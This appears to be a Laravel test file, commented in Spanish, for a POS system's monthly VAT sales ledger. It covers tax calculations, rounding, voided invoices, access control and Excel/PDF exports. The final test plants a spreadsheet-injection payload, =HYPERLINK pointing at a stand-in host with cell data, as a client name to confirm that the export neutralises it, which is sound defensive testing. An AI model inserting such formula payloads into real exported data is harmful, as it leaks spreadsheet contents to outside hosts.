<?php

namespace Tests\Feature;

use App\Models\Caja;
use App\Models\Cliente;
use App\Models\MetodoPago;
use App\Models\Producto;
use App\Models\Usuario;
use App\Models\Venta;
use App\Services\Cajas;
use App\Services\LibroDeVentas;
use App\Services\Ventas;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Illuminate\Support\Facades\DB;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Tests\TestCase;

/**
 * El Libro de Ventas IVA, borrador para el contador.
 *
 * Los importes esperados se calculan a mano en los comentarios, con el precio
 * de estante de la semilla (4,50 el arroz): no se copian de lo que devuelve el
 * sistema.
 */
class LibroDeVentasTest extends TestCase
{
    use DatabaseTransactions;

    private function admin(): Usuario
    {
        return Usuario::where('usuario', 'admin')->firstOrFail();
    }

    private function cajero(): Usuario
    {
        return Usuario::where('usuario', 'cajero1')->firstOrFail();
    }

    private function almacenero(): Usuario
    {
        return Usuario::where('usuario', 'almacen')->firstOrFail();
    }

    private function empresa(): Cliente
    {
        return Cliente::where('tipo_persona', 'JURIDICA')->firstOrFail();
    }

    /** @param  array<int, array{0: string, 1: float}>  $lineas  [código, cantidad] */
    private function vender(array $lineas, ?Cliente $cliente): Venta
    {
        $cajero = $this->cajero();
        $sesion = Cajas::sesionDe($cajero) ?? Cajas::abrir(Caja::firstOrFail(), $cajero, 100);

        return Ventas::registrar(
            sesion: $sesion->fresh(),
            usuario: $cajero,
            lineas: array_map(fn ($l) => [
                'producto_id' => Producto::where('codigo', $l[0])->value('id'),
                'cantidad' => $l[1],
            ], $lineas),
            pagos: [['metodo_pago_id' => MetodoPago::where('codigo', 'EFECTIVO')->value('id'), 'monto' => null]],
            cliente: $cliente,
        );
    }

    /** @return array<string, mixed> */
    private function libroDeHoy(): array
    {
        return LibroDeVentas::mes((int) now()->format('Y'), (int) now()->format('n'));
    }

    // ============================================================= contenido

    /** Los recibos no son facturas y no van en el libro. */
    public function test_solo_entran_las_facturas(): void
    {
        $factura = $this->vender([['P-0001', 2]], $this->empresa());
        $recibo = $this->vender([['P-0001', 1]], null);

        $numeros = array_column($this->libroDeHoy()['filas'], 'factura');

        $this->assertContains($factura->comprobante->numero_completo, $numeros);
        $this->assertNotContains($recibo->comprobante->numero_completo, $numeros);
    }

    /**
     * El débito fiscal es el 13 % de lo cobrado, como en Bolivia, y NO el
     * impuesto del ticket, que el sistema calcula sumando la tasa a la base.
     */
    public function test_el_debito_fiscal_es_el_13_por_ciento_de_lo_cobrado(): void
    {
        // 2 arroz a 4,50 de estante: se cobran 8,99 (base 7,96 + impuesto 1,03).
        $venta = $this->vender([['P-0001', 2]], $this->empresa());

        $fila = collect($this->libroDeHoy()['filas'])->firstWhere('factura', $venta->comprobante->numero_completo);

        $this->assertSame('V', $fila['estado']);
        $this->assertSame(8.99, $fila['importe_total']);
        $this->assertSame(8.99, $fila['base_debito']);
        $this->assertSame(1.17, $fila['debito_fiscal']);     // ROUND(8,99 × 0,13, 2) = 1,1687
        $this->assertSame(1.03, $fila['impuesto_ticket']);   // lo que dice el ticket: otro cálculo
        $this->assertSame($venta->comprobante->cliente_nombre, $fila['cliente']);
        $this->assertStringContainsString('NIT', $fila['documento']);
    }

    /**
     * Medio centavo exacto: 6,50 × 0,13 = 0,845, que redondeado es 0,85. En
     * coma flotante vale 0,84499999… y según la versión de PHP da 0,84. El
     * libro calcula en centavos enteros para que no dependa de eso.
     */
    public function test_el_medio_centavo_redondea_hacia_arriba(): void
    {
        $venta = $this->vender([['P-0005', 1]], $this->empresa());   // una gaseosa: 6,50

        $fila = collect($this->libroDeHoy()['filas'])->firstWhere('factura', $venta->comprobante->numero_completo);

        $this->assertSame(6.5, $fila['base_debito']);
        $this->assertSame(0.85, $fila['debito_fiscal']);
    }

    /** Lo vendido sin impuesto va a exentas y no forma parte de la base. */
    public function test_lo_exento_no_paga_debito_fiscal(): void
    {
        Producto::where('codigo', 'P-0011')->update(['afecto_impuesto' => false]);

        // 2 arroz (8,99) + 4 galletas exentas a 1,06 (4,24, sin impuesto) = 13,23.
        $venta = $this->vender([['P-0001', 2], ['P-0011', 4]], $this->empresa());

        $fila = collect($this->libroDeHoy()['filas'])->firstWhere('factura', $venta->comprobante->numero_completo);

        $this->assertSame(13.23, $fila['importe_total']);
        $this->assertSame(4.24, $fila['exentas']);
        $this->assertSame(8.99, $fila['base_debito']);       // 13,23 − 4,24
        $this->assertSame(1.17, $fila['debito_fiscal']);     // solo sobre lo gravado
    }

    /** Una factura anulada se declara igual, con estado A e importes en cero. */
    public function test_una_factura_anulada_figura_en_cero(): void
    {
        $venta = $this->vender([['P-0001', 2]], $this->empresa());
        Ventas::anular($venta->fresh(), $this->admin(), 'Factura mal emitida');

        $fila = collect($this->libroDeHoy()['filas'])->firstWhere('factura', $venta->comprobante->numero_completo);

        $this->assertNotNull($fila, 'la factura anulada desapareció del libro');
        $this->assertSame('A', $fila['estado']);
        $this->assertSame(0.0, $fila['importe_total']);
        $this->assertSame(0.0, $fila['debito_fiscal']);
    }

    public function test_cada_mes_lleva_solo_sus_facturas(): void
    {
        $deAntes = $this->vender([['P-0001', 1]], $this->empresa());
        $mesPasado = now()->subMonthNoOverflow()->startOfMonth()->addDays(9);
        DB::table('comprobantes')->where('id', $deAntes->comprobante->id)->update(['fecha_emision' => $mesPasado]);

        $deHoy = $this->vender([['P-0001', 1]], $this->empresa());

        $esteMes = array_column($this->libroDeHoy()['filas'], 'factura');
        $anterior = array_column(LibroDeVentas::mes((int) $mesPasado->format('Y'), (int) $mesPasado->format('n'))['filas'], 'factura');

        $this->assertContains($deHoy->comprobante->numero_completo, $esteMes);
        $this->assertNotContains($deAntes->comprobante->numero_completo, $esteMes);
        $this->assertContains($deAntes->comprobante->numero_completo, $anterior);
    }

    public function test_los_totales_suman_las_filas(): void
    {
        $this->vender([['P-0001', 2]], $this->empresa());   // 8,99 → débito 1,17
        $this->vender([['P-0005', 1]], $this->empresa());   // 6,50 → débito 0,85 (6,50 × 0,13 = 0,845)

        $libro = $this->libroDeHoy();

        $this->assertEqualsWithDelta(
            array_sum(array_column($libro['filas'], 'debito_fiscal')),
            $libro['totales']['debito_fiscal'], 0.001);
        $this->assertEqualsWithDelta(
            array_sum(array_column($libro['filas'], 'importe_total')),
            $libro['totales']['importe_total'], 0.001);
    }

    // ============================================================== pantalla

    public function test_lo_ven_quienes_ven_reportes(): void
    {
        $venta = $this->vender([['P-0001', 2]], $this->empresa());

        foreach ([$this->admin(), $this->almacenero()] as $usuario) {
            $this->actingAs($usuario)
                ->get(route('reportes.libro-ventas'))
                ->assertOk()
                ->assertSee($venta->comprobante->numero_completo)
                ->assertSee('Borrador para el contador');
        }

        $this->actingAs($this->cajero())->get(route('reportes.libro-ventas'))->assertForbidden();
    }

    /** La diferencia con el impuesto del ticket queda a la vista, con los números del mes. */
    public function test_avisa_que_el_impuesto_del_ticket_no_es_el_debito_fiscal(): void
    {
        $this->vender([['P-0001', 2]], $this->empresa());

        $this->actingAs($this->admin())
            ->get(route('reportes.libro-ventas'))
            ->assertSee('El impuesto del ticket no es el débito fiscal');
    }

    public function test_se_descarga_en_excel_y_en_pdf(): void
    {
        $this->vender([['P-0001', 2]], $this->empresa());
        $mes = now()->format('Y-m');

        $this->actingAs($this->admin())
            ->get(route('reportes.libro-ventas.excel', ['mes' => $mes]))
            ->assertOk()
            ->assertDownload("libro-ventas-iva_{$mes}.xlsx");

        $this->actingAs($this->admin())
            ->get(route('reportes.libro-ventas.pdf', ['mes' => $mes]))
            ->assertOk()
            ->assertHeader('content-type', 'application/pdf');
    }

    /**
     * Con muchas facturas dompdf se queda sin memoria y el mes entero da error
     * 500. Pasado el tope no se genera: se ofrece el Excel, que trae lo mismo.
     */
    public function test_un_libro_demasiado_largo_para_pdf_ofrece_el_excel(): void
    {
        $this->vender([['P-0001', 2]], $this->empresa());
        $this->vender([['P-0004', 1]], $this->empresa());
        config(['ventas.pdf_max_filas' => 1]);
        $mes = now()->format('Y-m');

        $this->actingAs($this->admin())
            ->from(route('reportes.libro-ventas', ['mes' => $mes]))
            ->get(route('reportes.libro-ventas.pdf', ['mes' => $mes]))
            ->assertRedirect(route('reportes.libro-ventas', ['mes' => $mes]))
            ->assertSessionHas('error', fn ($m) => str_contains($m, 'Descarga el Excel'));

        $this->actingAs($this->admin())
            ->get(route('reportes.libro-ventas.excel', ['mes' => $mes]))
            ->assertOk();

        $this->actingAs($this->admin())
            ->get(route('reportes.ventas.pdf'))
            ->assertSessionHas('error', fn ($m) => str_contains($m, 'el PDF admite hasta 1'));
    }

    /**
     * Un cliente registrado como «=HYPERLINK(...)» salía como fórmula viva en el
     * Excel de quien lo abriera. Se guarda como texto.
     */
    public function test_un_nombre_que_parece_formula_sale_como_texto_en_el_excel(): void
    {
        $empresa = $this->empresa();
        $empresa->forceFill(['razon_social' => '=HYPERLINK("http://x.test/?d="&A1,"Ver")'])->save();
        $this->vender([['P-0001', 1]], $empresa->fresh());
        $mes = now()->format('Y-m');

        $respuesta = $this->actingAs($this->admin())->get(route('reportes.libro-ventas.excel', ['mes' => $mes]))->assertOk();
        $fichero = tempnam(sys_get_temp_dir(), 'xlsx').'.xlsx';
        file_put_contents($fichero, $respuesta->streamedContent());

        try {
            $libro = IOFactory::load($fichero);
        } finally {
            @unlink($fichero);
        }

        $celdas = [];
        foreach ($libro->getAllSheets() as $hoja) {
            foreach ($hoja->getRowIterator() as $fila) {
                foreach ($fila->getCellIterator() as $celda) {
                    if (str_contains((string) $celda->getValue(), 'HYPERLINK')) {
                        $celdas[] = $celda->getDataType();
                    }
                }
            }
        }

        $this->assertNotEmpty($celdas, 'el cliente no aparece en el libro');
        $this->assertNotContains('f', $celdas, 'quedó como fórmula');
    }
}
